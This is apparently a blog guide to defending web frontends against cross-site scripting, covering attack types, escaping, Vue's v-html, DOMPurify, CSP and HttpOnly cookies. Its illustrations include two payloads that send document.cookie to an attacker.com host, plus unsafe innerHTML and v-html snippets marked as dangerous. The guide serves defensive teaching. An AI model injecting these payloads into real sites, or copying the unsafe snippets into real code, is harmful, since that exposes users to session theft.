---
title: "Frontend Security: XSS Defense Guide"
date: 2018-03-08 10:50:19
tags:
  - Security
readingTime: 2
description: "XSS (Cross-Site Scripting) is one of the most common frontend security vulnerabilities. This article systematically covers everything from attack mechanisms to "
---

XSS (Cross-Site Scripting) is one of the most common frontend security vulnerabilities. This article systematically covers everything from attack mechanisms to defense strategies.

## The Three Types of XSS

### Stored XSS

An attacker stores a malicious script in the database, which executes when other users visit the page:

```
Attacker submits a comment: <script>document.location='http://attacker.com/steal?c='+document.cookie</script>

Server saves it to the database
↓
Other users load the comment list
↓
Browser executes the script, sending cookies to the attacker's server
```

Most damaging, because every user who visits the page is affected.

### Reflected XSS

The malicious script is embedded in a URL and the user is tricked into clicking it:

```
Normal URL:   https://example.com/search?q=frontend
Malicious URL: https://example.com/search?q=<script>alert(document.cookie)</script>

The server injects the q parameter directly into HTML:
<p>Search results: <script>alert(document.cookie)</script></p>
```

### DOM-Based XSS

The attack happens on the client side without going through the server:

```javascript
// Dangerous code: directly inserts URL parameters into the DOM
const query = location.search.substring(1);
document.getElementById("result").innerHTML = "Search: " + query;

// Attack URL: ?<img src=x onerror=alert(document.cookie)>
```

## Defense Strategies

### 1. Output Encoding (The Basics)

Never insert user input directly into HTML. Use an escape function:

```javascript
function escapeHTML(str) {
  return str
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#x27;");
}

// Usage
element.textContent = userInput; // ✅ safe — browser escapes automatically
element.innerHTML = escapeHTML(userInput); // ✅ manually escaped

element.innerHTML = userInput; // ❌ dangerous!
```

Vue's `{{ }}` template interpolation automatically escapes text content, making it safe by default:

```vue
{% raw %}
<template>
  <!-- ✅ Safe: auto-escaped -->
  <p>{{ userComment }}</p>

  <!-- ❌ Dangerous: v-html does NOT escape -->
  <p v-html="userComment"></p>
</template>
{% endraw %}
```

### 2. Safe Use of v-html

If you truly need to render HTML (e.g. rich text), you must sanitize it first:

```javascript
import DOMPurify from "dompurify";

// Configure allowed tags and attributes
const clean = DOMPurify.sanitize(dirtyHTML, {
  ALLOWED_TAGS: ["b", "i", "em", "strong", "a", "p", "ul", "ol", "li"],
  ALLOWED_ATTR: ["href", "target"],
});
```

```vue
<p v-html="sanitizedContent"></p>
```

### 3. CSP (Content Security Policy)

Tell the browser via an HTTP response header which resource origins are allowed:

```
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-xxx';
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;
  connect-src 'self' https://api.example.com
```

Even if XSS code is injected, CSP prevents the malicious script from loading and executing.

Nginx configuration:

```nginx
add_header Content-Security-Policy "default-src 'self'; script-src 'self'";
```

### 4. HttpOnly Cookie

Set session tokens to HttpOnly so they cannot be read by JavaScript:

```
Set-Cookie: token=xxx; HttpOnly; Secure; SameSite=Strict
```

Even if XSS occurs, attackers cannot steal the token via `document.cookie`.

### 5. Input Validation

Frontend validation is only an aid; real validation must happen on the server side. However, the frontend should also:

```javascript
// Rich text editors: restrict allowed HTML tags
// URL parameters: validate format, reject javascript: protocol
function isSafeURL(url) {
  try {
    const parsed = new URL(url);
    return ["http:", "https:"].includes(parsed.protocol);
  } catch {
    return false;
  }
}

// ❌ javascript:alert(1)  → rejected
// ✅ https://example.com   → allowed
```

## A Real-World Incident

**Case: Search Box Reflected XSS**

```vue
<!-- ❌ Displaying URL parameters directly with v-html, without escaping -->
<template>
  <p v-html="'Search: ' + $route.query.keyword"></p>
</template>
```

Attack URL: `?keyword=<img src=x onerror="fetch('https://attacker.com?c='+document.cookie)">`

Fix:

```vue
{% raw %}
<!-- ✅ Use text interpolation — auto-escaped -->
<template>
  <p>Search: {{ $route.query.keyword }}</p>
</template>
{% endraw %}
```

## Defense Checklist

- [ ] Avoid using `innerHTML`; prefer `textContent`
- [ ] Use `v-html` in Vue with caution — always sanitize first
- [ ] Server-side: HTML-escape all output
- [ ] Configure a CSP response header
- [ ] Set session cookies to `HttpOnly` + `Secure`
- [ ] Validate URL protocol before using URL parameters

## Summary

The core principle of XSS defense: **never trust user input**, and always escape on output. CSP and HttpOnly are additional defense layers that limit damage if something goes wrong.
